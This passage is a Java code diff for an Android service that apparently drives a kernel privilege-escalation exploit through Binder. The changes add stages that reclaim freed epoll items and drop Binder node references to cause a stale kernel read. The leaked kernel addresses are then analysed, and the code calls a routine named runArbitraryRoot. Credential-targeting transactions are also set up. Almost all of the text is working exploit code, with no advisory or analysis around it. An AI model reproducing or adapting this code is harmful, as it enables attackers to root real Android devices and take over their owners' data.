@@ -27,6 +27,7 @@ import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.StandardCopyOption;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.Collections;
 import java.util.HashSet;
 import java.util.IdentityHashMap;
@@ -34,17 +35,47 @@ import java.util.List;
 import java.util.Set;
 import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.ExecutionException;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
 import java.util.concurrent.FutureTask;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.TimeoutException;
 import java.util.concurrent.atomic.AtomicBoolean;
+import java.util.concurrent.atomic.AtomicInteger;
 
 public final class HarnessService extends Service {
     private static final int COPY_SIGNAL_PORT = 47391;
+    private static final int REFERENCE_HOLDER_COUNT = 64;
+    private static final int RAW_BINDER_HOLDER_COUNT = 512;
+    private static final int RAW_CURRENT_PROC_MARKER_HOLDERS = 8;
+    private static final boolean RAW_BINDER_HOLDER_CANDIDATE = true;
+    private static final boolean MIXED_DISCLOSURE_CANDIDATE = true;
+    private static final int RAW_BINDER_FILLER_MIN = 20;
+    private static final int RAW_BINDER_FILLER_VARIANTS = 8;
+    private static final int RAW_BINDER_PRIME_REFS_PER_HOLDER = 32;
+    private static final int RAW_BROKER_CALLBACK_CODE = 0x42b0;
+    static final int RAW_BROKER_HOLDER_CODE = 0x42b1;
+    private static final int RAW_BROKER_HOLDER_PROOF = 0x50524852;
+    private static final int RAW_BROKER_ROOT_PROOF = 0x50525252;
+    private static final int RAW_BROKER_PRIME_PROOF = 0x50525052;
+    private static final String RAW_BROKER_CALLBACK_EXTRA =
+            "raw_broker_callback";
+    private static final String RAW_BROKER_HOLDER_EXTRA =
+            "raw_broker_holder";
+    private static final String RAW_BROKER_HOLDER_INDEX_EXTRA =
+            "raw_broker_holder_index";
+    private static final int RAW_BROKER_HOLDER_INDEX_SENTINEL = 0x71d3a91b;
+    private static final String RAW_BROKER_VICTIM_EXTRA =
+            "raw_broker_victim";
+    private static final String RAW_BROKER_FOREGROUND_EXTRA =
+            "raw_broker_foreground";
+    private static final String RAW_BROKER_MARKER_DESCRIPTOR =
+            "com.vandam.prism.RawBrokerMarker";
     static final int FILLERS_PER_PROCESS = 24;
     private static final String TAG = "LP3BinderDirect";
     private static final String CHANNEL = "lp3-binder-direct";
     private static final int RAW_VICTIM_COUNT = 19;
+    private static final boolean BATCHED_TERMINAL_WRITES = false;
     private static final int TERMINAL_RETIREMENT_TIMEOUT_MS = 10000;
     private static final int TERMINAL_RETIREMENT_WORKER_TIMEOUT_MS = 15000;
     private static final int TRANSACTION_PREPARE_PRIVATE_CREDENTIAL = 0x42b5;
@@ -95,6 +126,7 @@ public final class HarnessService extends Service {
     private final RawClientSlot[] extraRawClientSlots =
             createExtraRawClientSlots();
     private String extraRawClientState = "status=fail stage=raw-client-extra";
+    private volatile boolean rawVictimContextsActive;
     private String credentialTargetState =
             "status=fail stage=credential-target";
     private IBinder credentialTarget;
@@ -126,8 +158,20 @@ public final class HarnessService extends Service {
     private volatile boolean rwPrepared;
     private IBinder controlledNode;
     private final Binder kernelAnchor = new Binder();
+    private final Binder rawCurrentProcMarker = new Binder();
+    private final Binder rawBrokerMarker =
+            new Binder(RAW_BROKER_MARKER_DESCRIPTOR);
+    private final ExecutorService rawBrokerExecutor =
+            Executors.newFixedThreadPool(8, runnable -> {
+                Thread thread = new Thread(runnable, "raw-broker");
+                thread.setDaemon(true);
+                return thread;
+            });
     private int kernelAnchorRetained;
+    private int rawCurrentProcMarkerRetained;
     private IBinder[] fillerNodes;
+    private IBinder[] rawBinderPrimeNodes;
+    private Parcel rawControlledNodeParcel;
     private long controlledPointer;
     private long controlledCookie;
     private long rawControlledPointer;
@@ -141,6 +185,11 @@ public final class HarnessService extends Service {
     private String processTeardownSignal = "not-requested";
     private final List<ServiceConnection> isolatedConnections =
             new ArrayList<>();
+    private final List<RawBinderHolderEndpoint> rawBinderHolderEndpoints =
+            new ArrayList<>();
+    private volatile boolean rawBinderHoldersActive;
+    private volatile String rawBinderHolderBootstrapState =
+            "status=fail stage=raw-binder-holder-bootstrap reason=not-run";
     private final Set<Integer> isolatedPids = new HashSet<>();
     private volatile List<IsolatedControllerPair> isolatedControllerPairs =
             Collections.emptyList();
@@ -151,10 +200,23 @@ public final class HarnessService extends Service {
     private static final class IsolatedControllerPair {
         final IBinder controller;
         final int pid;
+        long deathBarrier;
 
-        IsolatedControllerPair(IBinder controller, int pid) {
+        IsolatedControllerPair(IBinder controller, int pid,
+                               long deathBarrier) {
             this.controller = controller;
             this.pid = pid;
+            this.deathBarrier = deathBarrier;
+        }
+    }
+
+    private static final class RawBinderHolderEndpoint {
+        final IBinder callback;
+        long deathBarrier;
+
+        RawBinderHolderEndpoint(IBinder callback, long deathBarrier) {
+            this.callback = callback;
+            this.deathBarrier = deathBarrier;
         }
     }
 
@@ -175,6 +237,7 @@ public final class HarnessService extends Service {
         int pid = -1;
         long pointer;
         long cookie;
+        long deathBarrier;
         boolean bound;
         boolean unbinding;
         boolean connectedOnce;
@@ -214,6 +277,11 @@ public final class HarnessService extends Service {
         return isRootFlow(requestedStage);
     }
 
+    private boolean useMixedDisclosure() {
+        return MIXED_DISCLOSURE_CANDIDATE &&
+                ("chain-addresses".equals(requestedStage) || isRootFlow());
+    }
+
     private final ServiceConnection connection = new ServiceConnection() {
         @Override
         public void onServiceConnected(ComponentName name, IBinder service) {
@@ -227,7 +295,8 @@ public final class HarnessService extends Service {
                     (("chain-addresses".equals(stage) ||
                       isRootFlow(stage)) &&
                             !chainSecondOwner)) {
-                String handleState = NativeBridge.cacheOwnerHandle();
+                String handleState = NativeBridge.cacheOwnerHandleForBinder(
+                        service, OwnerService.DESCRIPTOR);
                 if (!handleState.startsWith("status=pass")) {
                     publish("status=fail stage=epitem-leak handle=[" +
                             handleState + "]");
@@ -240,7 +309,8 @@ public final class HarnessService extends Service {
             }
             if ("node-address".equals(stage) ||
                     "fake-node-check".equals(stage)) {
-                String handleState = NativeBridge.cacheOwnerHandle();
+                String handleState = NativeBridge.cacheOwnerHandleForBinder(
+                        service, OwnerService.DESCRIPTOR);
                 if (!handleState.startsWith("status=pass") ||
                         !fetchControlledNode(service) ||
                         !fetchFillerNodes(service)) {
@@ -361,8 +431,8 @@ public final class HarnessService extends Service {
                     OwnerService.TRANSACTION_IDENTITY);
             ownerServicePid = ownerProcessIdentity == null
                     ? -1 : ownerProcessIdentity.pid;
-            String handleState = NativeBridge.cacheOwnerHandleForDescriptor(
-                    OwnerService2.DESCRIPTOR);
+            String handleState = NativeBridge.cacheOwnerHandleForBinder(
+                    service, OwnerService2.DESCRIPTOR);
             if (!handleState.startsWith("status=pass") ||
                     !fetchControlledNode(service) ||
                     !fetchFillerNodes(service)) {
@@ -400,11 +470,52 @@ public final class HarnessService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        requestedStage = intent == null
+        String incomingStage = intent == null
                 ? "bootstrap" : intent.getStringExtra("stage");
-        if (requestedStage == null) {
-            requestedStage = "bootstrap";
+        if (incomingStage == null) {
+            incomingStage = "bootstrap";
         }
+        if ("raw-binder-broker".equals(incomingStage)) {
+            boolean foreground = intent.getBooleanExtra(
+                    RAW_BROKER_FOREGROUND_EXTRA, false);
+            if (foreground) {
+                NotificationManager manager =
+                        getSystemService(NotificationManager.class);
+                manager.createNotificationChannel(new NotificationChannel(
+                        CHANNEL, "LP3 Binder Direct",
+                        NotificationManager.IMPORTANCE_LOW));
+                Notification notification = new Notification.Builder(
+                        this, CHANNEL)
+                        .setSmallIcon(android.R.drawable.stat_sys_warning)
+                        .setContentTitle("LP3 Binder Direct")
+                        .setContentText("Running a bounded Binder stage")
+                        .setOngoing(true)
+                        .build();
+                startForeground(1, notification);
+            }
+            IBinder callback = intent.getExtras() == null ? null :
+                    intent.getExtras().getBinder(RAW_BROKER_CALLBACK_EXTRA);
+            boolean holder = intent.getBooleanExtra(
+                    RAW_BROKER_HOLDER_EXTRA, false);
+            int holderIndex = intent.getIntExtra(
+                    RAW_BROKER_HOLDER_INDEX_EXTRA, -1);
+            boolean victim = intent.getBooleanExtra(
+                    RAW_BROKER_VICTIM_EXTRA, false);
+            IBinder victimTarget = victim ? rawTargetService : null;
+            Runnable response = () -> sendRawBrokerResponse(
+                    callback, holder, holderIndex, victim, victimTarget);
+            if (holder && !foreground && !victim) {
+                rawBrokerExecutor.execute(response);
+            } else {
+                response.run();
+            }
+            if (foreground && !holder) {
+                stopForeground(true);
+                stopSelf(startId);
+            }
+            return START_NOT_STICKY;
+        }
+        requestedStage = incomingStage;
         restoreAfterAction = intent == null ||
                 intent.getBooleanExtra("restore-after-action", true);
         directInitCred = intent != null &&
@@ -472,6 +583,142 @@ public final class HarnessService extends Service {
             stopSelf(startId);
             return START_NOT_STICKY;
         }
+        if ("parcel-probe".equals(requestedStage)) {
+            Parcel parcel = Parcel.obtain();
+            try {
+                Binder marker = new Binder();
+                parcel.writeInt(0x50524953);
+                parcel.writeStrongBinder(marker);
+                parcel.writeString("prism-parcel-probe");
+                publish(NativeBridge.inspectParcel(parcel));
+            } finally {
+                parcel.recycle();
+            }
+            stopForeground(true);
+            stopSelf(startId);
+            return START_NOT_STICKY;
+        }
+        if ("raw-binder-template".equals(requestedStage)) {
+            Parcel serviceManager = Parcel.obtain();
+            Parcel startService = Parcel.obtain();
+            try {
+                Binder callback = new Binder();
+                serviceManager.writeInterfaceToken(
+                        "android.os.IServiceManager");
+                serviceManager.writeString("activity");
+                Intent broker = new Intent(this, HarnessService.class);
+                broker.putExtra("stage", "raw-binder-broker");
+                android.os.Bundle extras = broker.getExtras();
+                if (extras == null) {
+                    extras = new android.os.Bundle();
+                }
+                extras.putBinder(RAW_BROKER_CALLBACK_EXTRA, callback);
+                extras.putBoolean(RAW_BROKER_HOLDER_EXTRA, false);
+                extras.putBoolean(RAW_BROKER_FOREGROUND_EXTRA, true);
+                broker.replaceExtras(extras);
+                startService.writeInterfaceToken(
+                        "android.app.IActivityManager");
+                startService.writeStrongBinder(null);
+                startService.writeTypedObject(broker, 0);
+                startService.writeString(null);
+                startService.writeBoolean(true);
+                startService.writeString(getPackageName());
+                startService.writeString(null);
+                startService.writeInt(Process.myUid() / 100000);
+                String service = NativeBridge.exportParcelTemplate(
+                        serviceManager,
+                        new File(getFilesDir(),
+                                "raw-route-service.template").getPath());
+                String start = NativeBridge.exportParcelTemplate(
+                        startService,
+                        new File(getFilesDir(),
+                                "raw-route-start.template").getPath());
+                publish("status=" +
+                        (service.startsWith("status=pass") &&
+                         start.startsWith("status=pass") ? "pass" : "fail") +
+                        " stage=raw-binder-template service=[" + service +
+                        "] start=[" + start + "]");
+            } finally {
+                startService.recycle();
+                serviceManager.recycle();
+            }
+            stopForeground(true);
+            stopSelf(startId);
+            return START_NOT_STICKY;
+        }
+        if ("raw-binder-route-probe".equals(requestedStage)) {
+            int routeCount = intent == null ? 1 :
+                    intent.getIntExtra("count", 1);
+            if (routeCount < 1 || routeCount > REFERENCE_HOLDER_COUNT) {
+                publish("status=fail stage=raw-binder-route" +
+                        " reason=count requested=" + routeCount);
+                stopForeground(true);
+                stopSelf(startId);
+                return START_NOT_STICKY;
+            }
+            Parcel serviceManager = Parcel.obtain();
+            Parcel startService = Parcel.obtain();
+            Binder callbackMarker = new Binder();
+            serviceManager.writeInterfaceToken("android.os.IServiceManager");
+            serviceManager.writeString("activity");
+
+            Intent broker = new Intent(this, HarnessService.class);
+            broker.putExtra("stage", "raw-binder-broker");
+            android.os.Bundle brokerExtras = broker.getExtras();
+            if (brokerExtras == null) {
+                brokerExtras = new android.os.Bundle();
+            }
+            brokerExtras.putBinder(RAW_BROKER_CALLBACK_EXTRA,
+                    callbackMarker);
+            broker.replaceExtras(brokerExtras);
+            startService.writeInterfaceToken("android.app.IActivityManager");
+            startService.writeStrongBinder(null);
+            startService.writeTypedObject(broker, 0);
+            startService.writeString(null);
+            startService.writeBoolean(false);
+            startService.writeString(getPackageName());
+            startService.writeString(null);
+            startService.writeInt(Process.myUid() / 100000);
+            long[] callbackTokens = NativeBridge.ownerTokens(callbackMarker);
+            new Thread(() -> {
+                String probe = "status=fail stage=raw-binder-route" +
+                        " reason=not-run";
+                int passed = 0;
+                long routeStarted = SystemClock.elapsedRealtimeNanos();
+                try {
+                    for (; callbackMarker.isBinderAlive() &&
+                            passed < routeCount; passed++) {
+                        probe = NativeBridge.rawBinderRouteProbe(
+                                    serviceManager, startService,
+                                    callbackTokens[0], callbackTokens[1],
+                                    routeCount > 1);
+                        if (!probe.startsWith("status=pass")) {
+                            break;
+                        }
+                    }
+                } finally {
+                    startService.recycle();
+                    serviceManager.recycle();
+                }
+                String release = routeCount > 1
+                        ? NativeBridge.releaseRawBinderRouteProbes()
+                        : "status=pass stage=raw-binder-route-release" +
+                                " released=0";
+                long durationMicros = (SystemClock.elapsedRealtimeNanos() -
+                        routeStarted) / 1000;
+                boolean complete = passed == routeCount &&
+                        probe.startsWith("status=pass") &&
+                        release.startsWith("status=pass");
+                publish("status=" + (complete ? "pass" : "fail") +
+                        " stage=raw-binder-route-series requested=" +
+                        routeCount + " passed=" + passed +
+                        " duration_us=" + durationMicros + " last=[" +
+                        probe + "] release=[" + release + "]");
+                stopForeground(true);
+                stopSelf(startId);
+            }, "raw-binder-route-probe").start();
+            return START_NOT_STICKY;
+        }
         if ("epitem-leak".equals(requestedStage) ||
                 "chain-addresses".equals(requestedStage) ||
                 isRootFlow() ||
@@ -536,7 +783,7 @@ public final class HarnessService extends Service {
             checkpoint("root-flow-start");
             isolatedRetirementGeneration =
                     NativeBridge.startIsolatedRetirementProof();
-            isolatedControllerPairs = Collections.emptyList();
+            discardIsolatedDeathBarriers();
             synchronized (isolatedPids) {
                 isolatedPids.clear();
             }
@@ -578,6 +825,10 @@ public final class HarnessService extends Service {
             }
             return START_NOT_STICKY;
         }
+        if ("epitem-leak".equals(requestedStage) ||
+                "chain-addresses".equals(requestedStage) || isRootFlow()) {
+            startService(new Intent(this, FirstClientWarmService.class));
+        }
         Intent owner = new Intent(this, OwnerService.class);
         ownerConnectionBound = bindService(
                 owner, connection, Context.BIND_AUTO_CREATE);
@@ -593,8 +844,45 @@ public final class HarnessService extends Service {
         return null;
     }
 
+    private void sendRawBrokerResponse(IBinder callback, boolean holder,
+            int holderIndex, boolean victim, IBinder victimTarget) {
+        boolean endpointReady = callback != null &&
+                (!victim || victimTarget != null);
+        if (endpointReady && holder) {
+            long barrier = NativeBridge.armBinderDeathBarrier(callback);
+            synchronized (rawBinderHolderEndpoints) {
+                endpointReady = barrier != 0 && holderIndex >= 0 &&
+                        holderIndex < RAW_BINDER_HOLDER_COUNT &&
+                        rawBinderHolderEndpoints.size() ==
+                                RAW_BINDER_HOLDER_COUNT &&
+                        rawBinderHolderEndpoints.get(holderIndex) == null;
+                if (endpointReady) {
+                    rawBinderHolderEndpoints.set(holderIndex,
+                            new RawBinderHolderEndpoint(callback, barrier));
+                } else if (barrier != 0) {
+                    NativeBridge.discardBinderDeathBarrier(barrier);
+                }
+            }
+        }
+        Parcel response = Parcel.obtain();
+        try {
+            response.writeInt(0x50524252);
+            response.writeStrongBinder(rawBrokerMarker);
+            if (victim) {
+                response.writeStrongBinder(victimTarget);
+            }
+            if (endpointReady) {
+                callback.transact(RAW_BROKER_CALLBACK_CODE, response, null,
+                        IBinder.FLAG_ONEWAY);
+            }
+        } catch (RemoteException exception) {
+            Log.e(TAG, "raw-binder-broker", exception);
+        } finally {
+            response.recycle();
+        }
+    }
+
     private void publish(String result) {
-        Log.i(TAG, result);
         try {
             writePrivateAtomic("direct.result", result);
         } catch (Exception exception) {
@@ -827,12 +1115,38 @@ public final class HarnessService extends Service {
         String result;
         try {
             checkpoint("epitem-start");
+            if ("chain-addresses".equals(requestedStage) || isRootFlow()) {
+                startService(new Intent(this, SecondOwnerWarmService.class));
+                startService(new Intent(this, SecondClientWarmService.class));
+            }
             Intent batchClient = new Intent(this,
                     ("chain-addresses".equals(requestedStage) ||
                      isRootFlow())
                             ? BatchClient2Service.class
                             : BatchClientService.class);
-            startService(batchClient);
+            if (useMixedDisclosure()) {
+                boolean chainProbe =
+                        "chain-addresses".equals(requestedStage);
+                if (ownerService == null ||
+                        !fetchFillerNodes(ownerService) ||
+                        (chainProbe &&
+                                !fetchControlledNode(ownerService))) {
+                    throw new IllegalStateException(
+                            "mixed-owner-objects");
+                }
+                if (chainProbe) {
+                    chainControlledState =
+                            NativeBridge.cacheControlledHandle(
+                                    controlledNode);
+                    if (!chainControlledState.startsWith("status=pass")) {
+                        throw new IllegalStateException(
+                                "mixed-controlled-handle");
+                    }
+                }
+            }
+            if (!startEpitemBatchClient(batchClient)) {
+                throw new IllegalStateException("epitem-client-death-arm");
+            }
             File ready = new File(getFilesDir(), "epitem-leak.unread-ready");
             File leak = new File(getFilesDir(), "epitem-leak.result");
             waitForEither(ready, leak, 120000);
@@ -840,6 +1154,8 @@ public final class HarnessService extends Service {
                     ? "epitem-reader-ready" : "epitem-reader-failed");
             if (!ready.exists()) {
                 result = readSmall(leak);
+            } else if (useMixedDisclosure()) {
+                result = runMixedDisclosure(handleState, leak);
             } else {
                 String reclaim = NativeBridge.reclaimWithEpitems(
                         getFilesDir().getAbsolutePath());
@@ -870,10 +1186,21 @@ public final class HarnessService extends Service {
             }
         } catch (Exception exception) {
             result = "status=fail stage=epitem-leak reason=exception type=" +
-                    exception.getClass().getSimpleName();
+                    exception.getClass().getSimpleName() + " message=" +
+                    safeCheckpointToken(exception.getMessage());
         }
         if ("chain-addresses".equals(requestedStage) ||
                 isRootFlow()) {
+            if (useMixedDisclosure()) {
+                publish(result);
+                if (!isRootFlow() ||
+                        "primitive-probe".equals(requestedStage) ||
+                        (!result.startsWith("status=pass") &&
+                                !kernelMutationStarted)) {
+                    finishEpitemLeak();
+                }
+                return;
+            }
             if (result.startsWith("status=pass")) {
                 Log.i(TAG, result);
                 continueChainWithNode(result);
@@ -889,18 +1216,286 @@ public final class HarnessService extends Service {
         finishEpitemLeak();
     }
 
+    private String runMixedDisclosure(String handleState, File leak)
+            throws Exception {
+        checkpoint("mixed-disclosure-start");
+        boolean root = isRootFlow();
+        boolean rootTopology = root ||
+                "chain-addresses".equals(requestedStage);
+        String targetState = "status=pass stage=raw-target skipped=1";
+        String clientState = "status=pass stage=raw-client skipped=1";
+        if (rootTopology) {
+            writePrivate("controlled-reader.request",
+                    "status=requested stage=fake-node-check");
+            writePrivate("raw-target.multi-export",
+                    "status=ready stage=raw-cohort-export");
+            writePrivate("raw-target.deferred-export",
+                    "status=ready clients=" + RAW_VICTIM_COUNT);
+        }
+
+        String prime = "status=pass stage=raw-binder-holder-prime skipped=1";
+        rawBinderHolderBootstrapState =
+                "status=pass stage=raw-binder-holder-bootstrap deferred=1";
+
+        String predrain = NativeBridge.prepareMixedEpitemReclaim(
+                getFilesDir().getAbsolutePath());
+        checkpoint(predrain.startsWith("status=pass")
+                ? "mixed-predrain-pass" : "mixed-predrain-failed");
+        if (!predrain.startsWith("status=pass")) {
+            return "status=miss stage=mixed-disclosure predrain=[" +
+                    predrain + "]";
+        }
+        String decrementFirst = NativeBridge.decrementNodeBatchRange(
+                getFilesDir().getAbsolutePath(), 0, 1024, true);
+        String decrement = decrementFirst;
+        checkpoint(decrement.startsWith("status=pass")
+                ? "mixed-decrement-pass" : "mixed-decrement-failed");
+        if (!decrement.startsWith("status=pass")) {
+            NativeBridge.discardMixedEpitemReclaim();
+            return "status=miss stage=mixed-disclosure decrement=[" +
+                    decrement + "]";
+        }
+        String early = NativeBridge.beginMixedEpitemReclaim();
+        checkpoint(early.startsWith("status=pass")
+                ? "mixed-epitem-early-pass" : "mixed-epitem-early-failed");
+        if (!early.startsWith("status=pass")) {
+            NativeBridge.discardMixedEpitemReclaim();
+            return "status=miss stage=mixed-disclosure early=[" + early + "]";
+        }
+        String earlyEpitems = NativeBridge.extendMixedEpitemReclaim(4096);
+        if (!earlyEpitems.startsWith("status=pass")) {
+            NativeBridge.discardMixedEpitemReclaim();
+            return "status=miss stage=mixed-disclosure early_epitems=[" +
+                    earlyEpitems + "]";
+        }
+        if (rootTopology) {
+            targetState = prepareRawTarget();
+            clientState = targetState.startsWith("status=pass")
+                    ? prepareRawClient()
+                    : "status=fail stage=raw-client reason=target";
+        }
+        if (!targetState.startsWith("status=pass") ||
+                !clientState.startsWith("status=pass")) {
+            NativeBridge.discardMixedEpitemReclaim();
+            return "status=miss stage=mixed-disclosure target=[" +
+                    targetState + "] client=[" + clientState + "]";
+        }
+        rawBinderHolderBootstrapState = prepareRawBinderHolders();
+        if (!rawBinderHolderBootstrapState.startsWith("status=pass")) {
+            NativeBridge.discardMixedEpitemReclaim();
+            return "status=miss stage=mixed-disclosure bootstrap=[" +
+                    rawBinderHolderBootstrapState + "]";
+        }
+        String rawExport = rootTopology
+                ? exportRawControlledNode()
+                : "status=pass stage=raw-controlled-export skipped=1";
+        if (rootTopology && rawExport.startsWith("status=pass")) {
+            controlledPointer = rawControlledPointer;
+            controlledCookie = rawControlledCookie;
+        }
+        if (!rawExport.startsWith("status=pass")) {
+            NativeBridge.discardMixedEpitemReclaim();
+            return "status=miss stage=mixed-disclosure export=[" +
+                    rawExport + "]";
+        }
+        String decrementSecond = NativeBridge.decrementNodeBatchRange(
+                getFilesDir().getAbsolutePath(), 1024, 128, false);
+        decrement = decrementFirst + " second=[" + decrementSecond + "]";
+        if (!decrementSecond.startsWith("status=pass")) {
+            NativeBridge.discardMixedEpitemReclaim();
+            return "status=miss stage=mixed-disclosure decrement_second=[" +
+                    decrementSecond + "]";
+        }
+        String latePrime =
+                "status=pass stage=raw-binder-holder-prime skipped=1";
+        String primeRelease = "status=pass" +
+                " stage=raw-binder-holder-handle-release skipped=1";
+        String binderWindow =
+                "status=pass stage=mixed-binder-window skipped=1";
+
+        String refs = rawExport.startsWith("status=pass")
+                ? rootTopology
+                        ? retainRawRootBinderHolderRefs(true)
+                        : retainRawBinderHolderRefs(true)
+                : "status=fail stage=raw-binder-refs reason=export";
+        if (!refs.startsWith("status=pass")) {
+            NativeBridge.discardMixedEpitemReclaim();
+            return "status=miss stage=mixed-disclosure refs=[" + refs + "]";
+        }
+
+        String currentProcMarker = rootTopology
+                ? retainRawCurrentProcMarkerPhase()
+                : "status=pass stage=raw-current-proc-marker skipped=1";
+        if (!currentProcMarker.startsWith("status=pass")) {
+            NativeBridge.discardMixedEpitemReclaim();
+            return "status=miss stage=mixed-disclosure marker=[" +
+                    currentProcMarker + "]";
+        }
+
+        String lateEpitems =
+                "status=pass stage=mixed-shared-epitem-extend skipped=1";
+
+        String epitems = NativeBridge.completeMixedEpitemReclaim();
+        String enabled = epitems.startsWith("status=pass")
+                ? NativeBridge.enableStaleRead(
+                        getFilesDir().getAbsolutePath())
+                : "status=fail stage=stale-read-enable reason=epitems";
+        checkpoint(enabled.startsWith("status=pass")
+                ? "mixed-read-enable-pass" : "mixed-read-enable-failed");
+        if (!enabled.startsWith("status=pass")) {
+            NativeBridge.discardMixedEpitemReclaim();
+            return "status=miss stage=mixed-disclosure epitems=[" +
+                    epitems + "] enabled=[" + enabled + "]";
+        }
+
+        waitForEither(leak, null, 120000);
+        String leakState = readSmall(leak);
+        boolean leakTransport = validMixedLeakTransport(leakState);
+        String nodeAnalysis = leakTransport
+                ? NativeBridge.analyseBinderRefLeak(
+                        getFilesDir().getAbsolutePath())
+                : "status=miss stage=binder-ref-leak reason=transport";
+        String epitemAnalysis = leakTransport
+                ? NativeBridge.analyseEpitemLeak(
+                        getFilesDir().getAbsolutePath())
+                : "status=miss stage=epitem-analysis reason=transport";
+        boolean disclosed = nodeAnalysis.startsWith("status=pass") &&
+                epitemAnalysis.startsWith("status=pass");
+        if (disclosed && rootTopology) {
+            String referenceRelease =
+                    NativeBridge.releaseRawBinderHolderHandles(
+                            RAW_BINDER_HOLDER_COUNT +
+                                    RAW_CURRENT_PROC_MARKER_HOLDERS,
+                            RAW_CURRENT_PROC_MARKER_HOLDERS);
+            String anchorPhase = referenceRelease.startsWith("status=pass")
+                    ? retainRawRootKernelAnchorPhase()
+                    : "status=fail stage=raw-root-anchor-phase " +
+                            "reason=reference-release";
+            String anchor = anchorPhase.startsWith("status=pass")
+                    ? retainKernelAnchor(RAW_BINDER_HOLDER_COUNT)
+                    : "status=fail stage=anchor-retain reason=phase";
+            refs = anchor.startsWith("status=pass")
+                    ? refs + " reference_release=[" + referenceRelease +
+                            "] anchor_phase=[" + anchorPhase +
+                            "] anchor=[" + anchor + "]"
+                    : "status=fail stage=raw-binder-refs " +
+                            "reference_release=[" + referenceRelease +
+                            "] anchor_phase=[" + anchorPhase +
+                            "] anchor=[" + anchor + "]";
+            disclosed = refs.startsWith("status=pass");
+        }
+        checkpoint(disclosed
+                ? "mixed-analysis-pass" : "mixed-analysis-failed");
+        writePrivate("binder-ref.analysis", nodeAnalysis);
+        writePrivate("epitem-leaks.bin.analysis", epitemAnalysis);
+        String disclosure = "status=" + (disclosed ? "pass" : "miss") +
+                " stage=mixed-disclosure handle=[" + handleState +
+                "] target=[" + targetState + "] client=[" + clientState +
+                "] bootstrap=[" + rawBinderHolderBootstrapState +
+                "] prime=[" + prime + "] decrement=[" + decrement +
+                "] predrain=[" + predrain + "] early=[" + early +
+                "] early_epitems=[" + earlyEpitems +
+                "] late_prime=[" + latePrime +
+                "] prime_release=[" + primeRelease +
+                "] binder_window=[" + binderWindow + "] export=[" + rawExport +
+                "] refs=[" + refs + "] current_proc_marker=[" +
+                currentProcMarker + "] late_epitems=[" + lateEpitems +
+                "] epitems=[" + epitems +
+                "] leak=[" + leakState + "] node=[" + nodeAnalysis +
+                "] epitem=[" + epitemAnalysis + "]";
+        if (!disclosed || !root) {
+            String release = releaseRawBinderHolders();
+            return "status=" +
+                    (disclosed && release.startsWith("status=pass")
+                            ? "pass" : "miss") +
+                    " stage=mixed-disclosure-gate disclosure=[" +
+                    disclosure + "] release=[" + release + "]";
+        }
+        return runArbitraryRoot(
+                handleState + " mixed=[" + disclosure + "]",
+                decrement, refs, nodeAnalysis);
+    }
+
+    private boolean validMixedLeakTransport(String state) {
+        int canonicalPairs = parseIntField(state, "canonical_pairs=");
+        int originalPairs = parseIntField(state, "original_pairs=");
+        int kernelValues = parseIntField(state, "kernel_values=");
+        int densePages = parseIntField(state, "dense_pages=");
+        return state.matches(
+                "^status=(?:pass|miss) stage=epitem-leak .*") &&
+                state.contains(" received=1152 expected=1152 ") &&
+                canonicalPairs >= 0 && originalPairs >= 0 &&
+                canonicalPairs + originalPairs > 0 &&
+                kernelValues >= 16 && densePages > 0 &&
+                state.contains(" end=1 binary=1 stale_buffers_freed=0");
+    }
+
+    private boolean startEpitemBatchClient(Intent intent) throws Exception {
+        CountDownLatch connected = new CountDownLatch(1);
+        IBinder[] service = new IBinder[1];
+        ServiceConnection connection = new ServiceConnection() {
+            @Override
+            public void onServiceConnected(ComponentName name,
+                                           IBinder binder) {
+                service[0] = binder;
+                connected.countDown();
+            }
+
+            @Override
+            public void onServiceDisconnected(ComponentName name) {
+            }
+        };
+        if (!bindService(intent, connection, Context.BIND_AUTO_CREATE) ||
+                !connected.await(5, TimeUnit.SECONDS) ||
+                service[0] == null) {
+            return false;
+        }
+        long barrier = NativeBridge.armBinderDeathBarrier(service[0]);
+        if (barrier == 0) {
+            unbindService(connection);
+            return false;
+        }
+        if (startService(intent) == null) {
+            NativeBridge.discardBinderDeathBarrier(barrier);
+            unbindService(connection);
+            return false;
+        }
+        new Thread(() -> {
+            String death = NativeBridge.awaitBinderDeathBarrier(
+                    barrier, 120000);
+            try {
+                unbindService(connection);
+            } catch (Exception ignored) {
+            }
+            try {
+                writePrivateAtomic("epitem-client.death-ready", death);
+            } catch (Exception exception) {
+                Log.e(TAG, "epitem-client-death", exception);
+            }
+        }, "epitem-client-death").start();
+        return true;
+    }
+
     private void continueChainWithNode(String epitemResult) {
         checkpoint("first-owner-cleanup-start");
+        boolean rawHolderCandidate = RAW_BINDER_HOLDER_CANDIDATE &&
+                ("chain-addresses".equals(requestedStage) || isRootFlow());
+        FutureTask<String> holderBootstrap = rawHolderCandidate
+                ? new FutureTask<>(this::prepareRawBinderHolders) : null;
+        if (holderBootstrap != null) {
+            new Thread(holderBootstrap,
+                    "raw-binder-holder-bootstrap").start();
+        }
         try {
             writePrivate("owner-fragments-cleanup.request",
                     "status=requested");
+            writePrivate("blockers-reset.request", "status=requested");
             File cleanupReady = new File(getFilesDir(),
                     "owner-fragments-cleanup.ready");
             waitForEither(cleanupReady, null, 30000);
             if (!readSmall(cleanupReady).startsWith("status=pass")) {
                 throw new IllegalStateException("fragment-cleanup");
             }
-            writePrivate("blockers-reset.request", "status=requested");
             File resetReady = new File(getFilesDir(),
                     "blockers-reset.ready");
             waitForEither(resetReady, null, 30000);
@@ -908,14 +1503,42 @@ public final class HarnessService extends Service {
                 throw new IllegalStateException("blocker-reset");
             }
         } catch (Exception exception) {
+            if (holderBootstrap != null) {
+                try {
+                    holderBootstrap.get(6, TimeUnit.SECONDS);
+                } catch (Exception ignored) {
+                }
+            }
             publish("status=fail stage=" + requestedStage + " epitem=[" +
                     epitemResult + "] reason=first-owner-reset");
             finishEpitemLeak();
             return;
         }
         clearEpitemLeakFiles();
-        checkpoint("second-owner-bind-start");
         chainAddressPrefix = "epitem=[" + epitemResult + "] ";
+        if (rawHolderCandidate) {
+            try {
+                rawBinderHolderBootstrapState = holderBootstrap.get(
+                        6, TimeUnit.SECONDS);
+            } catch (InterruptedException exception) {
+                Thread.currentThread().interrupt();
+                rawBinderHolderBootstrapState = "status=fail" +
